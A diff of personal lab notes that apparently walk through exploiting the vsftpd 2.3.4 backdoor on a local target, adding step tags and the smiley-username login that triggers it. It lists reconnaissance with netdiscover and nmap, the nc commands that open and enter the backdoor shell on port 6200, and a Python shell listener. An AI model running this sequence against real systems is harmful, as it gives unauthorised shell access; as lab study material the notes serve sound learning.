@@ -1,7 +1,15 @@
-kali-CMD sudo netdiscover          #Find the IPs on the network
+kali-CMD sudo netdiscover          #Find the IPs on the network PREP
 
-kali-CMD nmap -sV 192.168.1.100    #View the ports being used and the version of each application
+kali-CMD nmap -sV 192.168.1.100    #View the ports being used and the version of each application PREP
 
-kali-CMD nc 192.168.1.100 21       #Connects Kali system to port 21 (FTP) and on this vsftp 2.3.4 it opens a backdoor on port 6200
+kali-CMD nc 192.168.1.100 21       #Connects Kali system to port 21 (FTP) and on this vsftp 2.3.4 it opens a backdoor on port 6200 DURING
+    user Hacker:)
+    pass invalid
 
-kali-CMD2  nc 192.168.1.100 6200   #Connecting into the backdoor
+kali-CMD2  nc 192.168.1.100 6200   #Connecting into the backdoor DURING
+
+kali-CMD3 python3 ~/Desktop/shell/shellServer.py  #This opens the shellServer.py file where it is located and looks for a connection DURING
+
+
+
+
